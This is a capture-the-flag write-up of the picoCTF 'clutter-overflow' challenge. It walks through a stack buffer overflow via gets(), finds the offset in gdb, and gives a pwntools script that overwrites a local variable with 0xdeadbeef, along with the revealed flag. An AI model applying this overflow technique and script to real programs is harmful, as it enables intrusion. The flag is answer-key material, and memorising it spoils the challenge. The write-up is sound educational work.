# clutter-overflow #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoMini by redpwn, Buffer Overflow

## Description ##
Clutter, clutter everywhere and not a byte to use.

## Approach ##
I am provided with a binary file called `chall` and a C file called `chall.c`. Inspecting the C file, I can see that `gets` is used to read input from the user into a buffer `clutter` of size 256 bytes. The if statement checks if `code` is equal to `GOAL` (0xdeadbeef). If it is, it prints the flag. 

    long code = 0;
    char clutter[SIZE];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
 	
    puts(HEADER); 
    puts("My room is so cluttered...");
    puts("What do you see?");

    gets(clutter);


    if (code == GOAL) {
        printf("code == 0x%llx: how did that happen??\n", GOAL);
        puts("take a flag for your troubles");
        system("cat flag.txt");
    } else {
        printf("code == 0x%llx\n", code);
        printf("code != 0x%llx :(\n", GOAL);
    }

Since `gets` is used, I overflow `clutter` and overwrite the variable `code` with the value `GOAL` (0xdeadbeef). This will cause the if statement to print the flag. Before I figure out the padding, I use `gdb` to check what architecture the binary is compiled for:

    Arch:     amd64
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

It is compiled for `x86-64`. So I now need to figure out the padding to get to `code`, so opening up the binary file in gdb and setting a breakpoint at `main`:

    0x4006cb <main+4>     sub    rsp, 0x110                          RSP => 0x7fffffffdb40 (0x7fffffffdc50 - 0x110)

I see that the stack pointer is making a space of `0x110` (272 bytes). This means it is making space for the local variables and maybe realignment, since that includes `code`. I need to subtract that from the total space (272 bytes) to get the padding to `code`. `code` is type long and in x86-64, it is 8 bytes. Thus the padding is 264 padding bytes followed by `0xdeadbeef`, even though the buffer is 256 bytes, the compiler seems to added 8 extra bytes. With this in mine, I quickly wrote up a script to overflow the buffer and overwrite `code` with `0xdeadbeef`:

    from pwn import *

    HOST = 'mars.picoctf.net'
    PORT = 31890

    p = remote(HOST, PORT) 

    # p = process('./chall')

    # Padding to "code" and overwriting it with 0xdeadbeef
    payload = b'a'*264 + p64(0xdeadbeef)

    p.sendline(payload)

    p.interactive()

Running the script, I was able to get the flag:

    My room is so cluttered...
    What do you see?
    code == 0xdeadbeef: how did that happen??
    take a flag for your troubles
    picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

Flag: picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

## Reflection ## 
This is another classic buffer overflow challenge by showing how `gets` is unsafe and can be exploited. By exploiting an unchecked buffer write, I was able to overwrite a nearby stack variable and change the program's execution path. Working through this challenge helped me better understand stack memory layout, alignment, and why exploit offsets should be measured relative to the buffer.


